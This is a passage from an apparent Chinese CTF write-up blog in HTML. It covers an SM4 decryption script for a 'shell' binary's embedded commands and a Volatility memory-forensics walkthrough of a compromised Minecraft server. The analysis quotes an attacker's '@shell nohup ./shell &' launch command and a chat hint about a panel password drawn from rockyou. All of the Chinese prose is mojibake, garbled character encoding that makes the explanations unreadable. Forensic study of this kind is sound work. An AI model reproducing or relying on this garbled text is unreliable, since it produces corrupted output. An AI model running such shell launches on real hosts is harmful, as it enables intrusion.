class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt; pad &lt;= <span class="number">16</span>:</span><br><span class="line">                result = result[:-pad]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    binary_path = <span class="string">&quot;/home/mitu/111/shell&quot;</span></span><br><span class="line">    sbox, fk, ck = read_params(binary_path)</span><br><span class="line">    cipher = SM4(sbox, fk, ck)</span><br><span class="line">    </span><br><span class="line">    key_hex = <span class="string">&quot;ac46fb610b313b4f32fc642d8834b456&quot;</span></span><br><span class="line">    key_bytes = <span class="built_in">bytes</span>.fromhex(key_hex)</span><br><span class="line">    </span><br><span class="line">    ciphertext_hex = (</span><br><span class="line">        <span class="string">&quot;49b351855f211b85bd012f80ce8ed5b3&quot;</span></span><br><span class="line">        <span class="string">&quot;2cc5becb37ca595a89445461c6512efc&quot;</span></span><br><span class="line">        <span class="string">&quot;b863696da0c6bb28da46e09069dd644f&quot;</span></span><br><span class="line">        <span class="string">&quot;87e8faa921f3e67c530f1b6740a9d439794e426716d49f5e949d5d56f81ed54a97f6cc6752fcf7aa408a94e6a59029e7&quot;</span></span><br><span class="line">        <span class="string">&quot;b7c88bb0d92308a57f83d08a90ae024c&quot;</span></span><br><span class="line">        <span class="string">&quot;4331cfda21eeab8922fcc7acced16d1a17b02e8d2d9dfee48dc8f18e0dbbb2e4c4547e39d8c4aa2418d9fca52c9c4770&quot;</span></span><br><span class="line">        <span class="string">&quot;7f4b0ef4806983f164af6f46b71d3fce1e3c0bd00c4dd162b72c156f0f3aecd2afcabf551e08380db6fd20316f8a2729&quot;</span></span><br><span class="line">    )</span><br><span class="line">    ciphertext_hex = ciphertext_hex.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    ciphertext_bytes = <span class="built_in">bytes</span>.fromhex(ciphertext_hex)</span><br><span class="line">    </span><br><span class="line">    plaintext = cipher.decrypt(key_bytes, ciphertext_bytes)</span><br><span class="line">    <span class="built_in">print</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/image-20251229211824572.png" alt="image-20251229211824572"></p><p>å¾—åˆ°æ‰§è¡Œçš„å‘½ä»¤ä»¥åŠflag</p><h2 id="Mini-V-amp-N-CTF-2025"><a href="#Mini-V-amp-N-CTF-2025" class="headerlink" title="Mini V&amp;N CTF 2025"></a>Mini V&amp;N CTF 2025</h2><h3 id="MCServer"><a href="#MCServer" class="headerlink" title="MCServer"></a>MCServer</h3><blockquote><p>å‚è€ƒé“¾æ¥ï¼š<br><a href="https://goodlunatic.github.io/posts/761da51/#linux%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81">https://goodlunatic.github.io/posts/761da51/#linux%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81</a></p><p><a href="https://treasure-house.randark.site/blog/2023-10-25-MemoryForensic-Test/">https://treasure-house.randark.site/blog/2023-10-25-MemoryForensic-Test/</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzA3OTk5MjE2OQ==&amp;mid=2247484545&amp;idx=1&amp;sn=9b8c4d844d5efcf358d359021985f139&amp;chksm=9eefc873eb09dc94960d29cb83eef48966a2048ee1c90b2fe1ad8de81fe2fdd6176f32071fa3&amp;mpshare=1&amp;scene=23&amp;srcid=1206kW2mvbdeXjTKCDufzkYR&amp;sharer_shareinfo=76fdb4ba40b3e7dab6252c6ca0e3f354&amp;sharer_shareinfo_first=76fdb4ba40b3e7dab6252c6ca0e3f354#rd">https://mp.weixin.qq.com/s?__biz=MzA3OTk5MjE2OQ==&amp;mid=2247484545&amp;idx=1&amp;sn=9b8c4d844d5efcf358d359021985f139&amp;chksm=9eefc873eb09dc94960d29cb83eef48966a2048ee1c90b2fe1ad8de81fe2fdd6176f32071fa3&amp;mpshare=1&amp;scene=23&amp;srcid=1206kW2mvbdeXjTKCDufzkYR&amp;sharer_shareinfo=76fdb4ba40b3e7dab6252c6ca0e3f354&amp;sharer_shareinfo_first=76fdb4ba40b3e7dab6252c6ca0e3f354#rd</a></p><p><a href="https://xz.aliyun.com/news/17397">https://xz.aliyun.com/news/17397</a></p></blockquote><p>linuxå†…å­˜å–è¯ï¼Œéœ€è¦åˆ¶ä½œ<strong>Symbolsï¼ˆvol3ï¼‰</strong>æˆ–<strong>Profilesï¼ˆvol2ï¼‰</strong>,è¿™æ˜¯ Volatility çš„â€œåœ°å›¾â€ï¼Œå‘Šè¯‰ Volatility å¦‚ä½•æ­£ç¡®è§£æå’Œç†è§£ç‰¹å®šæ“ä½œç³»ç»Ÿï¼ˆåŠå…¶ç‰ˆæœ¬ï¼‰çš„å†…å­˜ç»“æ„ã€‚</p><h4 id="First-stepâ€”â€”æ‹¿åˆ°å†…å­˜é•œåƒçš„bannerä¿¡æ¯ï¼š"><a href="#First-stepâ€”â€”æ‹¿åˆ°å†…å­˜é•œåƒçš„bannerä¿¡æ¯ï¼š" class="headerlink" title="First stepâ€”â€”æ‹¿åˆ°å†…å­˜é•œåƒçš„bannerä¿¡æ¯ï¼š"></a>First stepâ€”â€”æ‹¿åˆ°å†…å­˜é•œåƒçš„bannerä¿¡æ¯ï¼š</h4><p><code>vol3 -f file banners.Banners</code></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512081359690.png" alt="image-20251208135905550"></p><p>bannerçš„å†…å®¹æ˜¯Linux å†…æ ¸ç‰ˆæœ¬çš„è¯¦ç»†ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š</p><p>å†…æ ¸ç‰ˆæœ¬ï¼š<code>Linux version 4.9.0-deepin13-amd64</code></p><p>ç¼–è¯‘è€…ï¼š<code>yangbo@deepin.com</code></p><p>ç¼–è¯‘å™¨ç‰ˆæœ¬ï¼š<code>gcc version 6.3.0 20170321 (Debian 6.3.0-11)</code></p><p>ç¼–è¯‘ç±»å‹ï¼š<code>#1 SMP PREEMPT</code></p><p>å‘è¡Œç‰ˆä¿¡æ¯ï¼š<code>Deepin 4.9.57-1</code></p><p>ç¼–è¯‘æ—¥æœŸï¼š<code>(2017-10-19)</code></p><h4 id="ä½¿ç”¨vol2è¿›è¡Œå–è¯ï¼Œéœ€è¦åˆ¶ä½œProfilesï¼š"><a href="#ä½¿ç”¨vol2è¿›è¡Œå–è¯ï¼Œéœ€è¦åˆ¶ä½œProfilesï¼š" class="headerlink" title="ä½¿ç”¨vol2è¿›è¡Œå–è¯ï¼Œéœ€è¦åˆ¶ä½œProfilesï¼š"></a>ä½¿ç”¨vol2è¿›è¡Œå–è¯ï¼Œéœ€è¦åˆ¶ä½œProfilesï¼š</h4><p>å†…å­˜é•œåƒç±»ä¼¼äºä¸€ä¸ªâ€åŸå§‹æ•°æ®å—â€ï¼Œå…¶ä¸­æ²¡æœ‰ç›®å½•ï¼Œç« èŠ‚æ ‡é¢˜å’Œé¡µç ï¼Œå…¨æ˜¯ä¹±åºçš„äºŒè¿›åˆ¶æ•°æ®ï¼ŒVolatility éœ€è¦çŸ¥é“ï¼šå“ªé‡Œæ˜¯è¿›ç¨‹åˆ—è¡¨çš„å¼€å§‹ï¼Ÿå“ªé‡Œæ˜¯ç½‘ç»œè¿æ¥è¡¨ï¼Ÿå†…æ ¸æ•°æ®ç»“æ„çš„å¸ƒå±€æ˜¯æ€æ ·çš„ï¼Ÿè¿™å°±æ˜¯ <strong>Profile</strong> çš„ä½œç”¨ã€‚</p><p>è€Œåœ¨linuxç³»ç»Ÿä¸­ï¼Œç”±äºå†…æ ¸çš„å¤šæ ·æ€§ï¼Œä¸€äº›å‘è¡Œç‰ˆçš„æ·±åº¦å®šåˆ¶ï¼Œä¸åŒé…ç½®ä¸‹çš„å·®å¼‚ï¼Œä¼šå¯¼è‡´volè‡ªæœ‰çš„Profileæ— æ³•ä½¿ç”¨ï¼Œå› æ­¤éœ€è¦åˆ¶ä½œå¯¹åº”çš„Profile</p><p>Profileå…·ä½“åŒ…å«äº†ï¼š</p><ul><li><p><strong>å†…æ ¸ç¬¦å·è¡¨ï¼š</strong></p><p>æ¥è‡ª<code>System.map</code> æˆ– <code>vmlinux</code>ï¼ˆå¸¦è°ƒè¯•ä¿¡æ¯çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼‰ï¼š</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// ç±»ä¼¼äºè¿™æ ·çš„æ˜ å°„ï¼š</span><br><span class="line">ffffffff81000000 T startup_64      // å¯åŠ¨ä»£ç åœ°å€</span><br><span class="line">ffffffff81800000 T init_task       // å…³é”®æ•°æ®ç»“æ„åœ°å€</span><br><span class="line">ffffffff81a00000 T modules         // æ¨¡å—åˆ—è¡¨åœ°å€</span><br></pre></td></tr></table></figure><p>å‘Šè¯‰ Volatility å…³é”®å†…æ ¸å‡½æ•°å’Œå˜é‡çš„<strong>å†…å­˜åœ°å€</strong></p><ul><li><strong>å†…æ ¸æ•°æ®ç»“æ„å®šä¹‰ï¼š</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¾‹å¦‚ task_structï¼ˆè¿›ç¨‹ç»“æ„ä½“ï¼‰åœ¨å†…å­˜ä¸­çš„å¸ƒå±€ï¼š</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">long</span> state;        <span class="comment">// åç§» 0x0</span></span><br><span class="line">    <span class="type">void</span> *<span class="built_in">stack</span>;                <span class="comment">// åç§» 0x8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tasks</span>;</span>     <span class="comment">// åç§» 0x10</span></span><br><span class="line">    <span class="type">pid_t</span> pid;                  <span class="comment">// åç§» 0x18</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è€Œåœ¨ä¸åŒå†…æ ¸ç‰ˆæœ¬çš„linuxä¸­ï¼Œç»“æ„ä½“å¸ƒå±€æ˜¯å®Œå…¨ä¸åŒçš„</p><ul><li><strong>ç‰¹å®šå†…æ ¸çš„é…ç½®ä¿¡æ¯ï¼š</strong></li></ul><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç¼–è¯‘æ—¶å¯ç”¨äº†å“ªäº›åŠŸèƒ½ï¼Ÿ</span><br><span class="line">å†…å­˜åˆ†é¡µå¤§å°æ˜¯å¤šå°‘ï¼Ÿ</span><br><span class="line">åœ°å€ç©ºé—´å¸ƒå±€ï¼ˆ32ä½ or 64ä½ï¼‰ï¼Ÿ</span><br></pre></td></tr></table></figure><h4 id="Profilesåˆ¶ä½œï¼š"><a href="#Profilesåˆ¶ä½œï¼š" class="headerlink" title="Profilesåˆ¶ä½œï¼š"></a>Profilesåˆ¶ä½œï¼š</h4><p>ä¸€ä¸ªvol2çš„Profileçš„ç»“æ„æ€»å…±åŒ…å«ä¸¤ä¸ªæ–‡ä»¶ï¼š<code>system.map(å†…æ ¸çš„é™æ€ç¬¦å·è¡¨)</code>ä»¥åŠ<code>module.dwarf(å†…æ ¸è°ƒè¯•æ–‡ä»¶)</code></p><p>å°†ä¸¤ä¸ªæ–‡ä»¶ç”¨deflateå‹ç¼©ç®—æ³•å‹ç¼©æˆä¸€ä¸ªzipå‹ç¼©åŒ…æ”¾åˆ°<code>volatility/volatility/plugins/overlays/linux</code>ç›®å½•ä¸‹å³å¯</p><ol><li>system.mapï¼š</li></ol><p>æ ¹æ®å·²çŸ¥çš„ <code>4.9.0-deepin13-amd64</code> å†…æ ¸ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¯ä»¥ç¡®å®šè¿™æ˜¯deepinæ“ä½œç³»ç»Ÿ 15.5 ç‰ˆæœ¬</p><p>ä¸‹è½½iso:<a href="https://sourceforge.net/projects/deepin/files/15.5/Release/deepin-15.5-amd64.iso/download">https://sourceforge.net/projects/deepin/files/15.5/Release/deepin-15.5-amd64.iso/download</a></p><p>ä½¿ç”¨vmwareåˆ›å»ºè™šæ‹Ÿæœºï¼Œè¿›è¡Œæ¢æºï¼Œå†å®‰è£…å¿…è¦è½¯ä»¶åŒ…ï¼š</p><p><code>sudo apt install openssh-server gcc make net-tools</code></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512081659326.png" alt="image-20251208165944248"></p><p>ä¸‹è½½<a href="https://github.com/microsoft/avml">AVML</a>åˆ°è™šæ‹Ÿæœºå†…ï¼Œå¹¶èµ‹äºˆæƒé™ï¼ˆchmod +x avmlï¼‰</p><p>ç„¶åå¼€å§‹åˆ¶ä½œé•œåƒï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512081703331.png" alt="image-20251208170306298"></p><p>å¾—åˆ°out.lime å†…å­˜é•œåƒæ–‡ä»¶</p><p>æ¥ä¸‹æ¥ï¼Œå¼€å§‹æ„å»º <code>dwarf</code> å†…æ ¸è°ƒè¯•æ–‡ä»¶ï¼Œä¸è·å– <code>System.map</code> å†…å­˜è¡¨æ–‡ä»¶</p><p>é¦–å…ˆä¼ è¾“ dwarf å†…æ ¸è°ƒè¯•æ–‡ä»¶çš„ç¼–è¯‘æ–‡ä»¶ï¼š<a href="https://github.com/volatilityfoundation/volatility/tree/master/tools/linux">volatility/tools/linux</a>ï¼Œå¹¶å°è¯•è¿›è¡Œç¼–è¯‘ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512081708395.png" alt="image-20251208170852339"></p><p>å¾—åˆ°äº†<code>module.dwarf</code>æ–‡ä»¶ã€‚</p><p>æ¥ä¸‹æ¥è·å– <code>System.map</code> å†…å­˜è¡¨æ–‡ä»¶ï¼š</p><p>å¯ä»¥ç›´æ¥æ‰¾åˆ°ï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512081710906.png" alt="image-20251208171056876"></p><p>å¾—åˆ°è¿™ä¸¤ä¸ªæ–‡ä»¶åï¼Œè¿›è¡Œå‹ç¼©å³å¯è·å¾—Profiles:</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512081714669.png" alt="image-20251208171439624"></p><p>å†æŠŠzipç§»åŠ¨åˆ°vol2å‚¨å­˜Profileçš„åœ°æ–¹(volatility2/volatility/plugins/overlays/linux/):</p><p>ä½¿ç”¨infoæ£€æŸ¥Profile:</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512081720674.png" alt="image-20251208172006629"></p><p>ä½¿ç”¨ profile è¿›è¡Œå†…å­˜é•œåƒçš„è§£æï¼š</p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512081730217.png" alt="image-20251208173058184"></p><p>æ¥ä¸‹æ¥å°±å¯ä»¥ä½¿ç”¨vol2è¿›è¡Œå†…å­˜å–è¯äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Q1 è›¤å®¢zymåœ¨Minecraftæ¸¸æˆä¸­çš„idæ˜¯ä»€ä¹ˆ?</span><br><span class="line">Q2 è¯·å¯»æ‰¾è›¤å®¢zymè¿›å…¥äº†ä¸Minecraftç›¸å…³çš„ä»€ä¹ˆç¨‹åº?</span><br><span class="line">Q3 è›¤å®¢zymè¿›å…¥ä¸Minecraftç›¸å…³çš„ç¨‹åºä½¿ç”¨çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯ä»€ä¹ˆ?</span><br><span class="line">Q4 è¯·ä»è›¤å®¢zymçš„å…¥ä¾µç—•è¿¹æ‰¾å‡ºä»–é€šè¿‡ä¸Šä¼ äº†ä»€ä¹ˆå¾—åˆ°äº†shell?</span><br></pre></td></tr></table></figure><p>Q1: æ¸¸æˆidï¼Œä¸€èˆ¬åœ¨æœåŠ¡å™¨çš„æ—¥å¿—ä¸­ä¼šä½“ç°ï¼š</p><p>åˆ—å‡ºæ‰€æœ‰æ–‡ä»¶æŸ¥æ‰¾ï¼š</p><p><code>python2 vol.py -f ~/Desktop/mem.mem --profile=LinuxDeepin_4_9_0-deepin13-amd64_profilex64 linux_enumerate_files &gt; ~/Desktop/1.txt</code></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512081741735.png" alt="image-20251208174118685"></p><p>å‘ç°äº†å¯ç–‘çš„æ—¥å¿—ï¼Œè¿›è¡Œå¯¼å‡ºï¼š</p><p><code>python2 vol.py -f ~/Desktop/mem.mem --profile=LinuxDeepin_4_9_0-deepin13-amd64_profilex64 linux_find_file -i 0xffff9b878779d3e8 -O ~/Desktop/chatty_log</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">[02:49:48] nOo0b (34fe703f-7330-30df-95e3-437457cda10e): wxmä½ æ¥äº†</span><br><span class="line">[02:51:33] Butt3rwXm (93b88d54-1917-32e5-827e-2a2a64fc9bbe): n0å¸ˆå‚…ï¼Œè¿™ä¸ªæ€ä¹ˆç©å•Š</span><br><span class="line">[02:51:49] nOo0b (34fe703f-7330-30df-95e3-437457cda10e): å‡ºç”Ÿç‚¹æœ‰æ•™ç¨‹</span><br><span class="line">[02:52:20] Butt3rwXm (93b88d54-1917-32e5-827e-2a2a64fc9bbe): n0å¸ˆå‚…ï¼Œè¿™ä¸ªç®±å­æ€ä¹ˆå¼€ä¸äº†å•Š</span><br><span class="line">[02:52:28] nOo0b (34fe703f-7330-30df-95e3-437457cda10e): æˆ‘çœ‹çœ‹</span><br><span class="line">[02:55:16] nOo0b (34fe703f-7330-30df-95e3-437457cda10e): å¥½åƒæ’ä»¶æœ‰ç‚¹é—®é¢˜</span><br><span class="line">[02:55:46] nOo0b (34fe703f-7330-30df-95e3-437457cda10e): è¿‡ä¸¤å¤©åŠ ä¸ªæ–°æ‰‹ç¤¼åŒ…æ›¿ä»£ç®±å­</span><br><span class="line">[02:55:55] Butt3rwXm (93b88d54-1917-32e5-827e-2a2a64fc9bbe): è¿™æ˜¯ä½ å¼„å¾—æœåŠ¡å™¨å—ï¼Œå¥½å¼ºå•Šn0å¸ˆå‚…</span><br><span class="line">[02:57:03] nOo0b (34fe703f-7330-30df-95e3-437457cda10e): æ˜¯å•Š</span><br><span class="line">[02:57:10] nOo0b (34fe703f-7330-30df-95e3-437457cda10e): ä½ è¦è¿›åå°vanvanå—</span><br><span class="line">[02:57:22] nOo0b (34fe703f-7330-30df-95e3-437457cda10e): å°±æ˜¯è¿™ä¸ªç”¨æˆ·åï¼Œå¯†ç è¿˜æ˜¯6rockyé‡Œé¢Aa+æ•°å­—é‚£ä¸ªçš„é‚£ä¸ªè€å¯†ç </span><br><span class="line">[02:57:55] nOo0b (34fe703f-7330-30df-95e3-437457cda10e): å°±æ˜¯è¿™ä¸ªç”¨æˆ·åï¼Œå¯†ç è¿˜æ˜¯Â§6rockyé‡Œé¢Aa+æ•°å­—é‚£ä¸ªçš„é‚£ä¸ªè€å¯†ç </span><br><span class="line">[02:58:12] nOo0b (34fe703f-7330-30df-95e3-437457cda10e): å°±æ˜¯è¿™ä¸ªç”¨æˆ·åï¼Œå¯†ç è¿˜æ˜¯Â§6rockyé‡Œé¢Aa+æ•°å­—é‚£ä¸ªçš„é‚£ä¸ªè€å¯†ç </span><br><span class="line">[02:59:36] 0ran93 (b8897229-baf9-3709-bc7d-a06b99cd70c7): è¿™ä¸ªæ€ä¹ˆç©å•Š</span><br><span class="line">[02:59:46] XuXX (2500ff07-1153-3335-8243-45c9bd3d9c70): ç›´æ¥æŒ–è„šä¸‹çš„æ–¹å—å°±è¡Œäº†</span><br><span class="line">[03:00:03] XuXX (2500ff07-1153-3335-8243-45c9bd3d9c70): å‡ºç”Ÿç‚¹å†™äº†å§</span><br><span class="line">[03:00:17] W4ngXunF1sh (0fdac309-0978-3cba-a820-c4c4da0acc0c): butterwxmæ˜¯å››å·èŒå¦¹å—</span><br><span class="line">[03:00:25] W4ngXunF1sh (0fdac309-0978-3cba-a820-c4c4da0acc0c): èƒ½ä¸€èµ·ç©å—</span><br><span class="line">[03:00:30] 5h3n9NaN (8c4e9748-4a49-3849-abc0-53a61b5b573e): èƒ½ä¸€èµ·ç©å—</span><br><span class="line">[03:00:35] XuXX (2500ff07-1153-3335-8243-45c9bd3d9c70): èƒ½ä¸€èµ·ç©å—</span><br><span class="line">[03:00:44] Butt3rwXm (93b88d54-1917-32e5-827e-2a2a64fc9bbe): å¯ä»¥å•Š</span><br><span class="line">[03:00:54] Butt3rwXm (93b88d54-1917-32e5-827e-2a2a64fc9bbe): æ€ä¹ˆæ‹‰äººå•Š</span><br><span class="line">[03:01:08] nOo0b (34fe703f-7330-30df-95e3-437457cda10e): is team invite</span><br><span class="line">[03:01:21] nOo0b (34fe703f-7330-30df-95e3-437457cda10e): ä½ å¯èƒ½æ²¡æƒé™ï¼Œæˆ‘æ¥å§</span><br><span class="line">[03:01:33] nOo0b (34fe703f-7330-30df-95e3-437457cda10e): æ‹‰å®Œäº†ç»™ä½ åˆ›é€ æˆ‘ä¸‹äº†</span><br><span class="line">[03:01:57] J4sm1ne4ur4 (452b75cf-9cc1-38be-9484-343c26e245fa): å‡ºç”Ÿç‚¹çš„ç®±å­æ€ä¹ˆå¼€ä¸äº†å•Š</span><br><span class="line">[03:03:06] nOo0b (34fe703f-7330-30df-95e3-437457cda10e): æˆ‘å…ˆä¸‹äº†</span><br><span class="line">[03:03:13] nOo0b (34fe703f-7330-30df-95e3-437457cda10e): æ˜å¤©å†ä¸€èµ·ç©å­¦å§</span><br><span class="line">[03:03:31] 0ran93 (b8897229-baf9-3709-bc7d-a06b99cd70c7): auraä½ æ¥äº†ï¼Œæ¥van</span><br><span class="line">[03:04:48] XuXX (2500ff07-1153-3335-8243-45c9bd3d9c70): æ†‹ç¬‘[1]</span><br><span class="line">[03:05:04] J4sm1ne4ur4 (452b75cf-9cc1-38be-9484-343c26e245fa): æ†‹ç¬‘éƒ½æ›´æ–°å‡º3.0å’Œ4.0äº†</span><br><span class="line">[03:07:01] 5h3n9NaN (8c4e9748-4a49-3849-abc0-53a61b5b573e): ä¸æ˜¯è¿™æ€ä¹ˆä¼šå‡ºè ¹è™«å’Œèœ˜è››ç½‘å•Šc</span><br><span class="line">[03:07:11] 0ran93 (b8897229-baf9-3709-bc7d-a06b99cd70c7): äºŒå·é€‰æ‰‹å–è¯å¤§å¸ˆå°±æ˜¯å¼º[ç‚¹èµ]</span><br><span class="line">[03:07:23] XuXX (2500ff07-1153-3335-8243-45c9bd3d9c70): äºŒå·é€‰æ‰‹å–è¯å¤§å¸ˆå°±æ˜¯å¼º[ç‚¹èµ]</span><br><span class="line">[03:08:20] 0ran93 (b8897229-baf9-3709-bc7d-a06b99cd70c7): ???wcï¼Œæ€ä¹ˆæ­»äº¡ä¼šæ‰è½å•Š</span><br><span class="line">[03:08:30] 5h3n9NaN (8c4e9748-4a49-3849-abc0-53a61b5b573e): runäº†</span><br><span class="line">[03:09:15] J4sm1ne4ur4 (452b75cf-9cc1-38be-9484-343c26e245fa): ???wcï¼Œæ€ä¹ˆæ­»äº¡ä¼šæ‰è½å•Š</span><br><span class="line">[03:11:06] Hu4ngrk1n (ad52f988-ed77-39fb-9c15-c24ec06cad1d): @butt3rwxm èƒ½å’Œä½ ä»¬ä¸€èµ·ç©å—</span><br><span class="line">[03:11:14] Hu4ngrk1n (ad52f988-ed77-39fb-9c15-c24ec06cad1d): ä¸€ä¸ªäººå¥½æ— èŠ</span><br><span class="line">[03:11:22] Butt3rwXm (93b88d54-1917-32e5-827e-2a2a64fc9bbe): æˆ‘çœ‹çœ‹æ€ä¹ˆæ‹‰äºº</span><br><span class="line">[03:11:30] Butt3rwXm (93b88d54-1917-32e5-827e-2a2a64fc9bbe): ä¸è¡Œå•Š</span><br><span class="line">[03:11:37] Butt3rwXm (93b88d54-1917-32e5-827e-2a2a64fc9bbe): æˆ‘å†è¯•è¯•</span><br><span class="line">[03:11:47] Butt3rwXm (93b88d54-1917-32e5-827e-2a2a64fc9bbe): æˆ‘çœ‹çœ‹n0å¸ˆå‚…ç¡æ²¡ç¡ï¼Œè®©ä»–ç»™ä¸ªæƒé™æˆ–è€…æ‹‰ä¸‹</span><br><span class="line">[03:14:33] nOo0b (34fe703f-7330-30df-95e3-437457cda10e): æˆ‘æŠŠå²›ä¸»è½¬ç»™ä½ äº†å­¦å§ï¼Œæˆ‘å…ˆç¡äº†</span><br><span class="line">[03:14:54] W4ngXunF1sh (0fdac309-0978-3cba-a820-c4c4da0acc0c): butterwxmç»™ä¸ªä¸‰å‰æˆŸï¼Œç»™ä½ è¡¨æ¼”ä¸ªé­”æœ¯</span><br><span class="line">[03:18:35] Butt3rwXm (93b88d54-1917-32e5-827e-2a2a64fc9bbe): å•Šï¼Ÿ</span><br><span class="line">[03:18:44] Butt3rwXm (93b88d54-1917-32e5-827e-2a2a64fc9bbe): ä¸æ˜¯æˆˆé—¨</span><br><span class="line">[03:18:46] Butt3rwXm (93b88d54-1917-32e5-827e-2a2a64fc9bbe): ï¼Ÿï¼Ÿ</span><br><span class="line">[03:19:21] Butt3rwXm (93b88d54-1917-32e5-827e-2a2a64fc9bbe): @nOo0b ç™»ä¸ä¸Šé¢æ¿a</span><br><span class="line">[03:19:40] Butt3rwXm (93b88d54-1917-32e5-827e-2a2a64fc9bbe): å¯†ç ä¸å¯¹å•Š</span><br><span class="line">[03:20:41] nOo0b (34fe703f-7330-30df-95e3-437457cda10e): æ”¹è¿‡äº†ï¼Œå°±æ˜¯rockyé‡Œé¢Aaå¼€å¤´é‚£ä¸ªï¼Œä¹‹å‰å¯èƒ½è¾“äº†ä¸€ä½</span><br><span class="line">[03:21:38] Butt3rwXm (93b88d54-1917-32e5-827e-2a2a64fc9bbe): okï¼Œæˆ‘å»çœ‹çœ‹</span><br><span class="line">[03:22:58] nOo0b (34fe703f-7330-30df-95e3-437457cda10e): xiale</span><br><span class="line">[03:47:03] W4ngXunF1sh (0fdac309-0978-3cba-a820-c4c4da0acc0c): @shell nohup ./shell &amp;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°æœ€åï¼Œ<strong>W4ngXunF1sh</strong>æ‰§è¡Œäº†<code>@shell nohup ./shell &amp;</code></p><p>å› æ­¤åˆ¤æ–­è¿™å³æ˜¯é»‘å®¢çš„id</p><p>Q2 è¯·å¯»æ‰¾è›¤å®¢zymè¿›å…¥äº†ä¸Minecraftç›¸å…³çš„ä»€ä¹ˆç¨‹åº?</p><p>æˆ‘ä»¬çŸ¥é“mcæ˜¯javaç¼–å†™çš„ï¼Œå°è¯•æ‰¾å‡ºæ‰€æœ‰<strong>Javaè¿›ç¨‹</strong>ï¼Œè¿™æ˜¯Minecraftçš„æ ¸å¿ƒï¼š</p><p><code>python2 vol.py -f ~/Desktop/mem.mem --profile=LinuxDeepin_4_9_0-deepin13-amd64_profilex64 linux_psaux | grep -i &quot;java&quot;</code></p><p><img src="https://czxh.oss-cn-beijing.aliyuncs.com/pic/202512081915195.png" alt="image-20251208191532133"></p><p>å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå«<strong><code>mcsmanager</code></strong>çš„ç¨‹åºï¼Œç»æœç´¢å‘ç°è¿™æ˜¯ä¸€æ¬¾å…è´¹ã€å¼€æºã€è½»é‡çº§çš„æ¸¸æˆæœåŠ¡å™¨æ§åˆ¶é¢æ¿ã€‚ä¸»è¦ç”¨äºç®¡ç† <strong>Minecraft æœåŠ¡å™¨</strong></p><p>å› 